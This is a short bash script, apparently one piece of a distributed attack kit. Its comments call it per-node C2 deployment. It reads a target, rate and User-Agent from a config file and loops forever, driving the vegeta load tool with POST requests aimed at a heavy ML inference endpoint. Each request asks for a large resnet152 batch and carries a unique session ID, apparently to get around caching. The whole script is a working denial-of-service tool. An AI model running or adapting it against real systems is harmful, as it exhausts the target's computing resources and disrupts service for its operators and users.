#!/bin/bash
# swarm_deploy.sh -- per-node C2 deployment
# Bridges swarm_config.json to vegeta with per-request UUID injection.
# vegeta cannot template dynamic values from static JSON; this script
# reads the config and runs a Python+vegeta pipeline identical to the
# local PoC but targeting the heavy POST endpoint.
URL=$(jq -r .target_url swarm_config.json)
RATE=$(jq -r .max_rps swarm_config.json)
UA=$(jq -r '.headers["User-Agent"]' swarm_config.json)

# Python target generator: vegeta HTTP format with unique session_id per request.
# ANSI-C quoting ($'...\n...'): \n = real newline (Python statement separator).
# \\n inside f-string: literal \n for vegeta target line breaks.
PY=$'import uuid,json,sys,signal\nsignal.signal(signal.SIGPIPE,signal.SIG_DFL)\nurl,ua=sys.argv[1],sys.argv[2]\nwhile True:\n    body=json.dumps({"batch_size":1000,"model":"resnet152","session_id":uuid.uuid4().hex})\n    print(f"POST {url}\\nUser-Agent: {ua}\\nContent-Type: application/json\\n\\n{body}\\n",flush=True)'

while true; do
  python3 -c "$PY" "$URL" "$UA" | \
  vegeta attack -format=http -rate="$RATE" -duration=5s | \
  vegeta report -type=json | \
  jq -c '{rate,codes:.status_codes}'
done
